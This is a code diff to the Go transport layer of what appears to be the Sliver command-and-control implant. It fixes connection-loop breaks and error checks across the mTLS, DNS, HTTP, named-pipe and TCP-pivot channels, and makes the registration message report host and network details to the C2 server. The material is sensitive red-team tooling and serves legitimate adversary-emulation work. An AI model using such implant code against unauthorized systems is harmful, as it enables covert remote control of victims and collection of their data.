@@ -23,7 +23,6 @@ import (
 	"log"
 	// {{end}}
 
-	"errors"
 	"fmt"
 	"io"
 	"net"
@@ -31,8 +30,11 @@ import (
 	"os"
 	"os/user"
 	"runtime"
-	"strconv"
 	"time"
+
+	// {{if .Config.MTLSc2Enabled}}
+	"strconv"
+	// {{end}}
 
 	"github.com/golang/protobuf/proto"
 
@@ -86,7 +88,7 @@ func (t *Transport) Start(isSwitch bool) (err error) {
 
 	connectionAttempts := 0
 
-	// ConnLoop:
+ConnLoop:
 	for connectionAttempts < maxErrors {
 
 		// We might have several transport protocols available, while some
@@ -113,31 +115,31 @@ func (t *Transport) Start(isSwitch bool) (err error) {
 				// {{end}}
 				connectionAttempts++
 			}
-			break
+			break ConnLoop
 			// {{end}} - MTLSc2Enabled
 		case "dns":
 			// {{if .Config.DNSc2Enabled}}
 			t.C2, err = dnsConnect(t.URL)
-			if err == nil {
+			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[dns] Connection failed: %s", err)
 				// {{end}}
 				connectionAttempts++
 			}
-			break
+			break ConnLoop
 			// {{end}} - DNSc2Enabled
 		case "https":
 			fallthrough
 		case "http":
 			// {{if .Config.HTTPc2Enabled}}
 			t.C2, err = httpConnect(t.URL)
-			if err == nil {
+			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err)
+				log.Printf("[%s] Connection failed: %s", t.URL.Scheme, err.Error())
 				// {{end}}
 				connectionAttempts++
 			}
-			break
+			break ConnLoop
 			// {{end}} - HTTPc2Enabled
 		case "namedpipe":
 			// {{if .Config.NamePipec2Enabled}}
@@ -148,7 +150,7 @@ func (t *Transport) Start(isSwitch bool) (err error) {
 				// {{end}}
 				connectionAttempts++
 			}
-			break
+			break ConnLoop
 			// {{end}} -NamePipec2Enabled
 		case "tcppivot":
 			// {{if .Config.TCPPivotc2Enabled}}
@@ -159,7 +161,7 @@ func (t *Transport) Start(isSwitch bool) (err error) {
 				// {{end}}
 				connectionAttempts++
 			}
-			break
+			break ConnLoop
 			// {{end}} -TCPPivotc2Enabled
 		default:
 			err = fmt.Errorf("Unknown c2 protocol: %s", t.URL.Scheme)
@@ -194,26 +196,16 @@ func (t *Transport) Start(isSwitch bool) (err error) {
 // In the case of a physical connection we yield a dedicated stream over which the implant will speak RPC.
 func (t *Transport) setupComm(isSwitch bool) (sessionStream io.ReadWriteCloser, err error) {
 
+	// {{if .Config.Debug}}
+	log.Printf("Setting up Comm system")
+	// {{end}}
+
 	// If we have a started RPC Connection and no net.Conn, we must register the
 	// Session before oppening any tunnel. After this we setup RPC-based Comms.
 	if !isSwitch && t.Conn == nil && t.C2 != nil && t.C2.IsOpen {
-
-		t.C2.Send <- registerSliver()
-
-		// Wait for the server to send a tunnel ID, or timeout
-		select {
-		case id := <-Transports.CommID:
-			tunnel := comm.NewTunnel(id, t.C2.Send)
-			_, err := comm.NewComm().InitClient(tunnel, true, []byte(keyPEM))
-			if err != nil {
-				return nil, err
-			}
-		case <-time.After(defaultNetTimeout):
-			return nil, errors.New("timed out waiting for a Comm Tunnel ID")
-		}
 	}
 
-	// Else, we have a net.Conn from the underlying transport connection, and use this.
+	// Else, we have a net.Conn from the underlying transport connection, and register over it.
 	if !isSwitch && t.Conn != nil {
 		sessionStream, err = comm.NewComm().InitClient(t.Conn, false, []byte(keyPEM))
 	}
@@ -258,7 +250,7 @@ func (t *Transport) Stop(force bool) (err error) {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("Transport closed (%s)", activeC2)
+	log.Printf("Transport closed (%s)", t.URL.String())
 	// {{end}}
 	return
 }
@@ -280,7 +272,7 @@ func (t *Transport) IsRouting() bool {
 	return false
 }
 
-func registerSliver() *sliverpb.Envelope {
+func (t *Transport) registerSliver() *sliverpb.Envelope {
 	hostname, err := os.Hostname()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -313,6 +305,13 @@ func registerSliver() *sliverpb.Envelope {
 			filename = "<< error >>"
 		}
 	}
+
+	// Additional network info
+	var remoteAddr string
+	if t.Conn != nil {
+		remoteAddr = t.Conn.LocalAddr().String()
+	}
+
 	data, err := proto.Marshal(&sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
@@ -324,11 +323,11 @@ func registerSliver() *sliverpb.Envelope {
 		Arch:              runtime.GOARCH,
 		Pid:               int32(os.Getpid()),
 		Filename:          filename,
-		ActiveC2:          GetActiveC2(),
+		ActiveC2:          t.URL.String(),
 		ReconnectInterval: uint32(GetReconnectInterval() / time.Second),
 		// Network & transport information.
-		Transport: Transports.Server.URL.Scheme,
-		// RemoteAddr: Transports.Server.Conn.LocalAddr().String(),
+		Transport:  t.URL.Scheme,
+		RemoteAddr: remoteAddr,
 	})
 	if err != nil {
 		// {{if .Config.Debug}}
